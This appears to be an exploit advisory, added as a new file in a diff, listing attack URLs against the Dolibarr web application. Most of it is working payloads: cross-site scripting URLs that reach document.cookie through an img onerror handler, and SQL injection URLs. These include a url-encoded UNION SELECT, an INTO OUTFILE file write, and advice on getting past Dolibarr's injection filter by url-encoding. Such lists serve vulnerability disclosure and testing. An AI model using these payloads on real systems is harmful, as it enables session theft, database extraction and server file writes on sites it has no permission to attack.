@@ -1,0 +1,39 @@
+Cross Site Scripting:
+
+http://www.example.com/index.php/%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.cookie%29%3E
+http://www.example.com/admin/boxes.php/%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.cookie%29%3 E
+http://www.example.com/comm/clients.php/%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.cookie%29% 3E
+http://www.example.com/commande/index.php/%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.cookie%2 9%3E
+http://www.example.com/admin/ihm.php?optioncss=%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.coo kie%29%3E
+http://www.example.com/user/home.php?optioncss=%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.coo kie%29%3E
+
+Successful exploitation of this vulnerabilities requires that Apache&#039;s directive &quot;AcceptPathInfo&quot; is set to &quot;on&quot; or &quot;default&quot; (default value is &quot;default&quot;)
+
+SQL Injection:
+
+http://www.example.com/user/index.php?sall=1%%27%29%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%201,version%28%29, 3,4,5,6,7,8,9,10,11,12,13,14%20--%20
+http://www.example.com/user/index.php?begin=search_user=&amp;sall=&amp;&amp;sortfield=SQL_CODE_HERE
+http://www.example.com/user/index.php?begin=search_user=&amp;sall=&amp;sortfield=u.login&amp;sortorder=SQL_CO DE_HERE
+
+Successful exploitation of this vulnerabilities requires attacker to be registered and logged-in.
+To bypass Dolibarr sql-injection filter and exploit this vulnerability an attacker should use url-encode technique.
+
+
+http://www.example.com/user/info.php?id=1 INTO OUTFILE &#039;../../../tmp/example&#039;
+
+Successful exploitation of this vulnerability requires attacker to be registered and logged-in.
+To bypass Dolibarr sql-injection filter and exploit this vulnerability an attacker should use url-encode technique.
+
+
+http://www.example.com/admin/boxes.php?action=delete&amp;rowid=SQL_CODE_HERE
+
+Successful exploitation of this vulnerability requires attacker to be registered and logged-in.
+To bypass Dolibarr sql-injection filter and exploit this vulnerability an attacker should use url-encode technique.
+
+
+http://www.example.com/user/group/index.php?begin=search_user=&amp;sall=&amp;&amp;sortfield=SQL_CODE_HERE
+http://www.example.com/user/group/index.php?begin=search_user=&amp;sall=&amp;sortfield=u.login&amp;sortorder= SQL_CODE_HERE
+http://www.example.com/user/group/index.php?sall=SQL_CODE_HERE
+
+Successful exploitation of this vulnerabilities requires attacker to be registered and logged-in.
+To bypass Dolibarr sql-injection filter and exploit this vulnerability an attacker should use url-encode technique.
